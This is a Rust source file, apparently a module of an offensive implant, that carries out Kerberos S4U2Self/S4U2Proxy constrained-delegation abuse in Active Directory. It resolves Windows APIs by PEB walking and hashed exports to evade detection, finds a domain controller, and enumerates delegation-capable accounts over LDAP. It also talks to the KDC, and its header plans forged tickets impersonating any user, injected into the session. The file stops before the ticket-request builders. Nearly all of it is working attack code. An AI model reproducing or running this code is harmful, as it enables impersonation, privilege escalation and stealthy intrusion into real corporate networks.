//! S4U2Self / S4U2Proxy Kerberos delegation abuse.
//!
//! Discovers Active Directory accounts configured with constrained delegation
//! (`msDS-AllowedToDelegateTo`) or protocol transition
//! (`TRUSTED_TO_AUTH_FOR_DELEGATION` in `userAccountControl`), then forges
//! Kerberos service tickets for arbitrary users by chaining two S4U extensions:
//!
//! 1. **S4U2Self** — a service account with `TRUSTED_TO_AUTH_FOR_DELEGATION`
//!    (protocol transition) can request a service ticket *to itself* on behalf
//!    of any domain user.  The TGS-REQ carries a `PA-FOR-USER` PA-DATA element
//!    naming the impersonated principal.  The resulting ticket contains the
//!    impersonated user's PAC.
//!
//! 2. **S4U2Proxy** — using the S4U2Self ticket as evidence, the service
//!    account requests a forwardable service ticket to a backend service listed
//!    in its `msDS-AllowedToDelegateTo`.  This yields a ticket that is accepted
//!    by the target service as if the impersonated user had authenticated
//!    directly.
//!
//! **Attack Flow**:
//! 1. Discover DC hostname via `DsGetDcNameW` (netapi32.dll)
//! 2. Connect to LDAP on the DC (wldap32.dll)
//! 3. Query for accounts with constrained delegation or protocol transition
//! 4. Select a delegation-capable service account
//! 5. Build S4U2Self TGS-REQ with PA-FOR-USER PA-DATA
//! 6. Send to KDC, parse S4U2Self TGS-REP
//! 7. Build S4U2Proxy TGS-REQ using the S4U2Self ticket as evidence
//! 8. Send to KDC, parse S4U2Proxy TGS-REP
//! 9. (Optional) Submit forged ticket to the current session via
//!    `LsaCallAuthenticationPackage` (KERB_SUBMIT_TKT)
//!
//! **Prerequisites**:
//! - Windows domain environment with at least one account configured for
//!   constrained delegation or protocol transition
//! - Agent runs on a domain-joined machine with network access to a DC
//! - The agent's context must have access to the service account's keys
//!   (or be running as that service account)
//!
//! **OPSEC**: All API functions resolved at runtime via PEB walking and
//! export-table hashing (`pe_resolve`).  No IAT entries are created.

#![cfg(windows)]

use std::ffi::OsStr;
use std::io::{Read, Write};
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use winapi::shared::guiddef::GUID;
use winapi::shared::minwindef::DWORD;
use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};

// ── Compile-time API hash constants ─────────────────────────────────────────

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// wldap32.dll — LDAP client functions (same as shadow_credentials.rs)
const WLDAP32_DLL_W: &[u16] = &[
    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16,
    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);

const FN_LDAP_INIT: u32 = hash_str_const(b"ldap_initW");
const FN_LDAP_BIND_S: u32 = hash_str_const(b"ldap_bind_sW");
const FN_LDAP_UNBIND: u32 = hash_str_const(b"ldap_unbind");
const FN_LDAP_SEARCH_S: u32 = hash_str_const(b"ldap_search_sW");
const FN_LDAP_FIRST_ENTRY: u32 = hash_str_const(b"ldap_first_entry");
const FN_LDAP_NEXT_ENTRY: u32 = hash_str_const(b"ldap_next_entry");
const FN_LDAP_GET_VALUES: u32 = hash_str_const(b"ldap_get_valuesW");
const FN_LDAP_VALUE_FREE: u32 = hash_str_const(b"ldap_value_freeW");
const FN_LDAP_MSGFREE: u32 = hash_str_const(b"ldap_msgfree");

// netapi32.dll — DC discovery
const NETAPI32_DLL_W: &[u16] = &[
    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);

const FN_DS_GET_DC_NAME_W: u32 = hash_str_const(b"DsGetDcNameW");
const FN_NET_API_BUFFER_FREE: u32 = hash_str_const(b"NetApiBufferFree");

// secur32.dll — LSA ticket submission
const SECUR32_DLL_W: &[u16] = &[
    's' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, '3' as u16,
    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_SECUR32_DLL: u32 = hash_wstr_const(SECUR32_DLL_W);

const FN_LSA_CONNECT_UNTRUSTED: u32 = hash_str_const(b"LsaConnectUntrusted");
const FN_LSA_CALL_AUTH_PACKAGE: u32 =
    hash_str_const(b"LsaCallAuthenticationPackage");
const FN_LSA_LOOKUP_AUTH_PACKAGE: u32 =
    hash_str_const(b"LsaLookupAuthenticationPackage");
const FN_LSA_FREE_RETURN_BUFFER: u32 = hash_str_const(b"LsaFreeReturnBuffer");

// ── LDAP type aliases ───────────────────────────────────────────────────────

type PLDAP = *mut c_void;
type PLDAPMSG = *mut c_void;

// LDAP search scope
const LDAP_SCOPE_SUBTREE: DWORD = 2;
const LDAP_SCOPE_BASE: DWORD = 0;

// LDAP auth methods
const LDAP_AUTH_NEGOTIATE: DWORD = 0x0486;

// ── DC discovery types ──────────────────────────────────────────────────────

#[repr(C)]
struct DOMAIN_CONTROLLER_INFO_W {
    domain_controller_name: LPWSTR,
    domain_controller_address: LPWSTR,
    domain_controller_address_type: DWORD,
    domain_guid: GUID,
    domain_name: LPWSTR,
    dns_forest_name: LPWSTR,
    flags: DWORD,
    dc_site_name: LPWSTR,
    client_site_name: LPWSTR,
}

// ── LSA types ───────────────────────────────────────────────────────────────

type HANDLE = *mut c_void;
type ULONG = u32;
type NTSTATUS = i32;
type PVOID = *mut c_void;

#[repr(C)]
struct UNICODE_STRING {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

// Kerberos authentication package message types
const KERB_RETRIEVE_ENCODED_TICKET: u32 = 8;
const KERB_SUBMIT_TKT: u32 = 10;

// ── Kerberos ASN.1 constants ────────────────────────────────────────────────

const KRB_PVNO: u8 = 5;
const KRB_TGS_REQ_MSG_TYPE: u8 = 12;
const KRB_TGS_REP_MSG_TYPE: u8 = 13;

// ASN.1 tag values
const ASN1_SEQUENCE: u8 = 0x30;
const ASN1_INTEGER: u8 = 0x02;
const ASN1_GENERAL_STRING: u8 = 0x1B;
const ASN1_OCTET_STRING: u8 = 0x04;
const ASN1_BIT_STRING: u8 = 0x03;

// APPLICATION tags
const ASN1_APPLICATION_12: u8 = 0x6C; // APPLICATION 12 = TGS-REQ
const ASN1_APPLICATION_13: u8 = 0x6D; // APPLICATION 13 = TGS-REP

// Context tags
const ASN1_CONTEXT_0: u8 = 0xA0;
const ASN1_CONTEXT_1: u8 = 0xA1;
const ASN1_CONTEXT_2: u8 = 0xA2;
const ASN1_CONTEXT_3: u8 = 0xA3;
const ASN1_CONTEXT_4: u8 = 0xA4;
const ASN1_CONTEXT_5: u8 = 0xA5;

// PA-DATA types
const PA_TGS_REQ: i32 = 1;
const PA_FOR_USER: i32 = 129; // S4U2Self PA-DATA type

// Kerberos name types
const KRB_NT_PRINCIPAL: i32 = 1;
const KRB_NT_SRV_INST: i32 = 2;

// KDC options flags (bit positions in KerberosFlags)
const KDC_OPT_FORWARDABLE: u32 = 0x40000000;
const KDC_OPT_CANONICALIZE: u32 = 0x00010000;

// Encryption types
const ETYPE_AES256_CTS_HMAC_SHA1_96: i32 = 18;

// userAccountControl flags
const TRUSTED_TO_AUTH_FOR_DELEGATION: DWORD = 0x01000000;

// ── Result types ────────────────────────────────────────────────────────────

/// An account discovered with constrained delegation configuration.
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct DelegationAccount {
    /// Distinguished name of the account.
    pub dn: String,
    /// SAM account name (e.g. `svc_sql$` or `jdoe`).
    pub sam_account_name: String,
    /// Service Principal Names registered on the account.
    pub spns: Vec<String>,
    /// Target SPNs the account is allowed to delegate to
    /// (from `msDS-AllowedToDelegateTo`).
    pub allowed_to_delegate_to: Vec<String>,
    /// Whether protocol transition is enabled
    /// (`TRUSTED_TO_AUTH_FOR_DELEGATION` in `userAccountControl`).
    pub protocol_transition: bool,
}

/// Result of an S4U2Self TGS request.
#[derive(Debug, Serialize, Deserialize)]
pub struct S4u2SelfResult {
    /// The impersonated user principal name.
    pub impersonated_user: String,
    /// The service account that requested the ticket.
    pub service_account: String,
    /// Raw TGS-REP bytes from the KDC.
    pub tgs_rep_bytes: Vec<u8>,
    /// Extracted service ticket (encrypted blob).
    pub ticket_bytes: Vec<u8>,
    /// Status message.
    pub status: String,
}

/// Result of an S4U2Proxy TGS request.
#[derive(Debug, Serialize, Deserialize)]
pub struct S4u2ProxyResult {
    /// The impersonated user principal name.
    pub impersonated_user: String,
    /// The target SPN for which the ticket was requested.
    pub target_spn: String,
    /// Raw TGS-REP bytes from the KDC.
    pub tgs_rep_bytes: Vec<u8>,
    /// Extracted service ticket (encrypted blob).
    pub ticket_bytes: Vec<u8>,
    /// Status message.
    pub status: String,
}

/// Result of the full S4U abuse chain.
#[derive(Debug, Serialize, Deserialize)]
pub struct S4uAbuseResult {
    /// The delegation-capable account used.
    pub delegation_account: DelegationAccount,
    /// S4U2Self result (impersonation ticket to self).
    pub s4u2self: S4u2SelfResult,
    /// S4U2Proxy result (forwarded ticket to target service), if requested.
    pub s4u2proxy: Option<S4u2ProxyResult>,
    /// Whether the ticket was submitted to the current LSA session.
    pub ticket_applied: bool,
    /// Status message.
    pub status: String,
}

// ── DER encoding helpers ────────────────────────────────────────────────────

/// Build a DER-encoded length field.
fn der_length(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else if len < 65536 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            (len >> 8) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

/// Wrap `content` in a DER SEQUENCE tag.
fn der_sequence(content: &[u8]) -> Vec<u8> {
    let mut out = vec![ASN1_SEQUENCE];
    out.extend_from_slice(&der_length(content.len()));
    out.extend_from_slice(content);
    out
}

/// Encode a DER INTEGER from an i64 value.
fn der_integer(value: i64) -> Vec<u8> {
    if value == 0 {
        return vec![ASN1_INTEGER, 0x01, 0x00];
    }
    let mut bytes = Vec::new();
    let mut v = value.unsigned_abs();
    while v > 0 {
        bytes.push((v & 0xFF) as u8);
        v >>= 8;
    }
    bytes.reverse();
    // Add leading zero if high bit set (positive number)
    if bytes[0] & 0x80 != 0 {
        bytes.insert(0, 0x00);
    }
    let mut out = vec![ASN1_INTEGER];
    out.extend_from_slice(&der_length(bytes.len()));
    out.extend_from_slice(&bytes);
    out
}

/// Encode a DER GeneralString.
fn der_general_string(s: &str) -> Vec<u8> {
    let mut out = vec![ASN1_GENERAL_STRING];
    out.extend_from_slice(&der_length(s.len()));
    out.extend_from_slice(s.as_bytes());
    out
}

/// Encode a DER OCTET STRING.
fn der_octet_string(data: &[u8]) -> Vec<u8> {
    let mut out = vec![ASN1_OCTET_STRING];
    out.extend_from_slice(&der_length(data.len()));
    out.extend_from_slice(data);
    out
}

/// Encode a DER BIT STRING (with zero unused bits).
fn der_bit_string(data: &[u8]) -> Vec<u8> {
    let mut out = vec![ASN1_BIT_STRING];
    out.extend_from_slice(&der_length(data.len() + 1));
    out.push(0x00); // no unused bits
    out.extend_from_slice(data);
    out
}

/// Encode an explicit context-tagged value: [tag] EXPLICIT inner.
fn der_context_explicit(tag: u8, inner: &[u8]) -> Vec<u8> {
    let context_tag = 0xA0 | (tag & 0x1F);
    let mut out = vec![context_tag];
    out.extend_from_slice(&der_length(inner.len()));
    out.extend_from_slice(inner);
    out
}

// ── Helper functions ────────────────────────────────────────────────────────

/// Convert a Rust string to a wide (UTF-16) null-terminated Vec<u16>.
fn str_to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

/// Convert a wide string to a Rust String.
fn wide_to_str(wide: &[u16]) -> Result<String> {
    let len = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
    String::from_utf16(&wide[..len]).context("Failed to decode wide string")
}

/// Get the length of a wide (null-terminated) string.
fn lstrlen_w(s: *const u16) -> i32 {
    let mut len = 0;
    unsafe {
        let mut p = s;
        while *p != 0 {
            len += 1;
            p = p.add(1);
        }
    }
    len
}

/// Format a Unix timestamp as a Kerberos time string (YYYYMMDDHHMMSSZ).
fn format_kerberos_time(ts: i64) -> String {
    let days = ts / 86400;
    let time_of_day = ts % 86400;
    let hours = time_of_day / 3600;
    let minutes = (time_of_day % 3600) / 60;
    let seconds = time_of_day % 60;
    let (year, month, day) = days_to_ymd(days);
    format!(
        "{:04}{:02}{:02}{:02}{:02}{:02}Z",
        year, month, day, hours, minutes, seconds
    )
}

/// Convert days since Unix epoch to year/month/day.
fn days_to_ymd(mut days: i64) -> (i64, i64, i64) {
    let mut year = 1970;
    loop {
        let year_days = if is_leap_year(year) { 366 } else { 365 };
        if days < year_days {
            break;
        }
        days -= year_days;
        year += 1;
    }
    let leap = is_leap_year(year);
    let month_days = [
        31,
        if leap { 29 } else { 28 },
        31,
        30,
        31,
        30,
        31,
        31,
        30,
        31,
        30,
        31,
    ];
    let mut month = 1;
    for &md in &month_days {
        if days < md {
            break;
        }
        days -= md;
        month += 1;
    }
    (year, month, days + 1)
}

fn is_leap_year(year: i64) -> bool {
    (year % 4 == 0 && year % 100 != 0) || year % 400 == 0
}

/// Get the current time as a Kerberos timestamp (seconds since epoch).
fn kerberos_timestamp() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as i64
}

/// Generate a random nonce for Kerberos requests.
fn random_nonce() -> u32 {
    // Use a simple approach: read from a timestamp-based source
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u32;
    ts ^ (ts << 16) ^ 0xDEAD_BEEF // Simple mixing
}

// ── DC discovery ────────────────────────────────────────────────────────────

/// Discover the domain controller hostname via `DsGetDcNameW`.
fn discover_dc() -> Result<String> {
    let netapi32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_NETAPI32_DLL) }
        .ok_or_else(|| anyhow!("netapi32.dll not found"))?;

    let ds_get_dc_name_w: unsafe extern "system" fn(
        LPCWSTR, // ComputerName
        LPCWSTR, // DomainName
        *const GUID, // DomainGuid
        LPCWSTR, // SiteName
        DWORD,   // Flags
        *mut *mut DOMAIN_CONTROLLER_INFO_W, // DomainControllerInfo
    ) -> DWORD = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_DS_GET_DC_NAME_W)
                .ok_or_else(|| anyhow!("DsGetDcNameW not found"))?,
        )
    };

    let net_api_buffer_free: unsafe extern "system" fn(*mut c_void) -> DWORD = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_NET_API_BUFFER_FREE)
                .ok_or_else(|| anyhow!("NetApiBufferFree not found"))?,
        )
    };

    let mut dc_info: *mut DOMAIN_CONTROLLER_INFO_W = ptr::null_mut();

    let result = unsafe {
        ds_get_dc_name_w(
            ptr::null(),       // local machine
            ptr::null(),       // current domain
            ptr::null(),       // no GUID
            ptr::null(),       // no site
            0,                 // no flags
            &mut dc_info,
        )
    };

    if result != 0 || dc_info.is_null() {
        bail!("DsGetDcNameW failed with error {}", result);
    }

    let dc_name = unsafe {
        let name_ptr = (*dc_info).domain_controller_name;
        if name_ptr.is_null() {
            net_api_buffer_free(dc_info as *mut c_void);
            bail!("DC name is null");
        }
        let name = wide_to_str(
            &std::slice::from_raw_parts(name_ptr, lstrlen_w(name_ptr) as usize + 1),
        );
        net_api_buffer_free(dc_info as *mut c_void);
        name
    }?;

    // Strip leading \\ if present
    let dc_hostname = dc_name
        .trim_start_matches('\\')
        .to_string();

    debug!("Discovered DC: {}", dc_hostname);
    Ok(dc_hostname)
}

// ── LDAP connection ─────────────────────────────────────────────────────────

/// Minimal LDAP connection using wldap32.dll via pe_resolve.
struct LdapConnection {
    ld: PLDAP,
}

impl Drop for LdapConnection {
    fn drop(&mut self) {
        if !self.ld.is_null() {
            let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) };
            if let Some(dll) = wldap32 {
                let ldap_unbind: unsafe extern "system" fn(PLDAP) -> DWORD = unsafe {
                    mem::transmute(
                        pe_resolve::get_proc_address_by_hash(dll, FN_LDAP_UNBIND)
                            .unwrap_or(0),
                    )
                };
                unsafe { ldap_unbind(self.ld) };
            }
        }
    }
}

impl LdapConnection {
    /// Connect to LDAP on the specified hostname using `ldap_initW` + `ldap_bind_sW`.
    fn connect(dc_hostname: &str) -> Result<Self> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_init_w: unsafe extern "system" fn(
            LPWSTR, // hostname
            DWORD,  // port
        ) -> PLDAP = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_INIT)
                    .ok_or_else(|| anyhow!("ldap_initW not found"))?,
            )
        };

        let ldap_bind_s_w: unsafe extern "system" fn(
            PLDAP,  // ld
            LPWSTR, // who (NULL = current user)
            LPWSTR, // cred (NULL = current user)
            DWORD,  // method
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_BIND_S)
                    .ok_or_else(|| anyhow!("ldap_bind_sW not found"))?,
            )
        };

        let host_w = str_to_wide(dc_hostname);
        let ld = unsafe { ldap_init_w(host_w.as_ptr() as LPWSTR, 389) };
        if ld.is_null() {
            bail!("ldap_initW failed for {}", dc_hostname);
        }

        let res = unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
        if res != 0 {
            bail!("ldap_bind_sW failed: error {}", res);
        }

        debug!("Connected to LDAP on {}", dc_hostname);
        Ok(LdapConnection { ld })
    }

    /// Get the default naming context (domain DN) from the Root DSE.
    fn get_default_naming_context(&self) -> Result<String> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe extern "system" fn(
            PLDAP,
            LPWSTR,
            DWORD,
            LPWSTR,
            *mut LPWSTR,
            DWORD,
            *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };

        let ldap_first_entry: unsafe extern "system" fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };

        let ldap_get_values_w: unsafe extern "system" fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };

        let ldap_value_free_w: unsafe extern "system" fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };

        let ldap_msgfree: unsafe extern "system" fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        let filter_w = str_to_wide("(objectClass=*)");
        let attr_nc = str_to_wide("defaultNamingContext");
        let mut attrs: Vec<LPWSTR> = vec![attr_nc.as_ptr() as LPWSTR, ptr::null_mut()];
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                ptr::null_mut(), // Root DSE
                LDAP_SCOPE_BASE,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            bail!("LDAP search for defaultNamingContext failed: error {}", res);
        }

        let entry = unsafe { ldap_first_entry(self.ld, result) };
        if entry.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No Root DSE entry found");
        }

        let nc_attr = str_to_wide("defaultNamingContext");
        let values = unsafe { ldap_get_values_w(self.ld, entry, nc_attr.as_ptr() as LPWSTR) };
        if values.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No defaultNamingContext attribute found");
        }

        let nc = unsafe {
            let val_ptr = *values;
            let s = wide_to_str(
                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
            )?;
            ldap_value_free_w(values);
            ldap_msgfree(result);
            s
        };

        debug!("Default naming context: {}", nc);
        Ok(nc)
    }

    /// Search for accounts with constrained delegation in the domain.
    fn find_delegation_accounts(&self, base_dn: &str) -> Result<Vec<DelegationAccount>> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe extern "system" fn(
            PLDAP,
            LPWSTR,
            DWORD,
            LPWSTR,
            *mut LPWSTR,
            DWORD,
            *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };

        let ldap_first_entry: unsafe extern "system" fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };

        let ldap_next_entry: unsafe extern "system" fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_NEXT_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_next_entry not found"))?,
            )
        };

        let ldap_get_values_w: unsafe extern "system" fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };

        let ldap_value_free_w: unsafe extern "system" fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };

        let ldap_msgfree: unsafe extern "system" fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        // LDAP filter: accounts with msDS-AllowedToDelegateTo set
        // (constrained delegation) OR TRUSTED_TO_AUTH_FOR_DELEGATION
        let filter = "(|(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))";
        let filter_w = str_to_wide(filter);
        let base_dn_w = str_to_wide(base_dn);

        // Request specific attributes
        let attr_dn = str_to_wide("distinguishedName");
        let attr_sam = str_to_wide("sAMAccountName");
        let attr_spn = str_to_wide("servicePrincipalName");
        let attr_delegate = str_to_wide("msDS-AllowedToDelegateTo");
        let attr_uac = str_to_wide("userAccountControl");

        let mut attrs: Vec<LPWSTR> = vec![
            attr_dn.as_ptr() as LPWSTR,
            attr_sam.as_ptr() as LPWSTR,
            attr_spn.as_ptr() as LPWSTR,
            attr_delegate.as_ptr() as LPWSTR,
            attr_uac.as_ptr() as LPWSTR,
            ptr::null_mut(),
        ];

        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                base_dn_w.as_ptr() as LPWSTR,
                LDAP_SCOPE_SUBTREE,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            bail!("LDAP search for delegation accounts failed: error {}", res);
        }

        let mut accounts = Vec::new();
        let mut entry = unsafe { ldap_first_entry(self.ld, result) };

        while !entry.is_null() {
            // Extract DN
            let dn = self.get_string_attr(entry, "distinguishedName", &ldap_get_values_w, &ldap_value_free_w);

            // Extract sAMAccountName
            let sam = self.get_string_attr(entry, "sAMAccountName", &ldap_get_values_w, &ldap_value_free_w);

            // Extract SPNs (multi-valued)
            let spns = self.get_multi_string_attr(entry, "servicePrincipalName", &ldap_get_values_w, &ldap_value_free_w);

            // Extract msDS-AllowedToDelegateTo (multi-valued)
            let allowed_to = self.get_multi_string_attr(entry, "msDS-AllowedToDelegateTo", &ldap_get_values_w, &ldap_value_free_w);

            // Extract userAccountControl
            let uac_str = self.get_string_attr(entry, "userAccountControl", &ldap_get_values_w, &ldap_value_free_w);
            let uac: DWORD = uac_str
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);
            let protocol_transition = (uac & TRUSTED_TO_AUTH_FOR_DELEGATION) != 0;

            if let (Some(dn), Some(sam)) = (dn, sam) {
                accounts.push(DelegationAccount {
                    dn,
                    sam_account_name: sam,
                    spns,
                    allowed_to_delegate_to: allowed_to,
                    protocol_transition,
                });
            }

            entry = unsafe { ldap_next_entry(self.ld, entry) };
        }

        unsafe { ldap_msgfree(result) };

        info!("Found {} delegation-capable accounts", accounts.len());
        Ok(accounts)
    }

    /// Get a single string attribute from an LDAP entry.
    fn get_string_attr(
        &self,
        entry: PLDAPMSG,
        attr: &str,
        ldap_get_values_w: &unsafe extern "system" fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR,
        ldap_value_free_w: &unsafe extern "system" fn(*mut LPWSTR) -> DWORD,
    ) -> Option<String> {
        let attr_w = str_to_wide(attr);
        let values = unsafe { ldap_get_values_w(self.ld, entry, attr_w.as_ptr() as LPWSTR) };
        if values.is_null() {
            return None;
        }
        let result = unsafe {
            let val_ptr = *values;
            if val_ptr.is_null() {
                ldap_value_free_w(values);
                return None;
            }
            let s = wide_to_str(
                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
            )
            .ok();
            ldap_value_free_w(values);
            s
        };
        result
    }

    /// Get a multi-valued string attribute from an LDAP entry.
    fn get_multi_string_attr(
        &self,
        entry: PLDAPMSG,
        attr: &str,
        ldap_get_values_w: &unsafe extern "system" fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR,
        ldap_value_free_w: &unsafe extern "system" fn(*mut LPWSTR) -> DWORD,
    ) -> Vec<String> {
        let attr_w = str_to_wide(attr);
        let values = unsafe { ldap_get_values_w(self.ld, entry, attr_w.as_ptr() as LPWSTR) };
        if values.is_null() {
            return Vec::new();
        }
        let mut result = Vec::new();
        let mut i = 0;
        unsafe {
            loop {
                let val_ptr = *values.add(i);
                if val_ptr.is_null() {
                    break;
                }
                if let Ok(s) = wide_to_str(
                    &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
                ) {
                    result.push(s);
                }
                i += 1;
            }
            ldap_value_free_w(values);
        }
        result
    }

    /// Get the realm (domain FQDN in uppercase) from the default naming context.
    fn get_realm(&self) -> Result<String> {
        let base_dn = self.get_default_naming_context()?;
        // Convert "DC=corp,DC=contoso,DC=com" to "CORP.CONTOSO.COM"
        let realm: String = base_dn
            .split(',')
            .filter(|s| s.trim().to_uppercase().starts_with("DC="))
            .filter_map(|s| s.trim().strip_prefix("DC=").or_else(|| s.trim().strip_prefix("dc=")))
            .collect::<Vec<_>>()
            .join(".");
        Ok(realm.to_uppercase())
    }

    /// Get the DNS hostname of a computer account from its DN.
    fn get_dns_hostname(&self, dn: &str) -> Result<String> {
        // Extract CN from DN, then construct the FQDN
        let cn = dn
            .split(',')
            .find(|s| s.trim().to_uppercase().starts_with("CN="))
            .and_then(|s| {
                s.trim()
                    .strip_prefix("CN=")
                    .or_else(|| s.trim().strip_prefix("cn="))
            })
            .unwrap_or("unknown");

        let realm = self.get_realm()?;
        // For computer accounts, strip trailing $ and construct FQDN
        let hostname = cn.trim_end_matches('$');
        Ok(format!("{}.{}", hostname.to_lowercase(), realm.to_lowercase()))
    }
}

// ── KDC communication ───────────────────────────────────────────────────────

/// Send a Kerberos request to the KDC via TCP (port 88).
/// Uses 4-byte big-endian length framing.
fn send_kdc_request(dc_hostname: &str, request: &[u8]) -> Result<Vec<u8>> {
    let addr = format!("{}:88", dc_hostname);
    debug!("Connecting to KDC at {}", addr);

    let mut stream =
        std::net::TcpStream::connect_timeout(&addr.parse()?, std::time::Duration::from_secs(10))
            .with_context(|| format!("Failed to connect to KDC at {}", addr))?;

    // KDC TCP framing: 4-byte big-endian length prefix
    let len = request.len() as u32;
    stream.write_all(&len.to_be_bytes())?;
    stream.write_all(request)?;
    stream.flush()?;

    // Read response
    let mut response_len_buf = [0u8; 4];
    stream.read_exact(&mut response_len_buf)?;
    let response_len = u32::from_be_bytes(response_len_buf) as usize;

    if response_len > 1024 * 1024 {
        bail!("KDC response too large: {} bytes", response_len);
    }

    let mut response = vec![0u8; response_len];
    stream.read_exact(&mut response)?;

    debug!("Received KDC response: {} bytes", response.len());
    Ok(response)
}

// ── Kerberos TGS-REQ construction ──────────────────────────────────────────

/// Build a Kerberos principal name (PrincipalName) DER encoding.
